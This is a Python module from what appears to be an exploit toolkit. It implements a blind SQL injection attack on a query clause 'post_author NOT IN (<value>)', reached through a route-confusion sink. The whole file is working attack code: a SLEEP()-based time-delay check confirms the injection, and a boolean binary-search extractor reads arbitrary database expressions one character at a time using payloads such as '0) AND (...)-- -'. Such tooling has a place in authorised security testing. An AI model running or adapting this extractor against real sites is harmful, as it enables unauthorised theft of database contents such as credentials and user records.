"""Blind SQL injection oracles and a string extractor over the route-confusion sink.

The injected value lands inside the query as:

    ... post_author NOT IN (<value>) ...

so a value of ``0) <sql>-- -`` closes the IN() list and appends arbitrary SQL.
"""

from __future__ import annotations

from typing import Callable, Optional, Tuple

from .client import BatchClient

_MIN_PRINTABLE = 32
_MAX_PRINTABLE = 126


class BlindSQLi:
    def __init__(self, client: BatchClient, *, sleep: float = 3.0) -> None:
        self.client = client
        self.sleep = sleep
        self.requests = 0

    def confirm(self) -> Tuple[bool, float, float]:
        """Confirm injectability with a differential time delay.

        Returns ``(confirmed, baseline_seconds, delayed_seconds)``. This reads no database
        content and modifies nothing.
        """
        baseline = self._elapsed("SLEEP(0)")
        delayed = self._elapsed(f"SLEEP({self.sleep:g})")
        confirmed = (delayed - baseline) >= (self.sleep - 1.0)
        return confirmed, baseline, delayed

    def extract(
        self,
        expression: str,
        *,
        max_length: int = 128,
        on_char: Optional[Callable[[str], None]] = None,
    ) -> str:
        """Read a string-valued SQL expression one character at a time (binary search)."""
        chars = []
        for position in range(1, max_length + 1):
            probe = f"ASCII(SUBSTRING(({expression}),{position},1))"
            if not self._true(f"{probe} > 0"):
                break
            low, high = _MIN_PRINTABLE, _MAX_PRINTABLE
            while low < high:
                mid = (low + high) // 2
                if self._true(f"{probe} > {mid}"):
                    low = mid + 1
                else:
                    high = mid
            chars.append(chr(low))
            if on_char:
                on_char("".join(chars))
        return "".join(chars)

    def integer(self, expression: str) -> int:
        """Read an integer-valued SQL expression."""
        text = self.extract(expression).strip()
        return int(text) if text.lstrip("-").isdigit() else 0

    def _elapsed(self, sql: str) -> float:
        self.requests += 1
        return self.client.inject(f"0) OR {sql}-- -").elapsed

    def _true(self, condition: str) -> bool:
        # get_items() returns rows only when the appended boolean condition holds.
        self.requests += 1
        return bool(self.client.rows(self.client.inject(f"0) AND ({condition})-- -")))
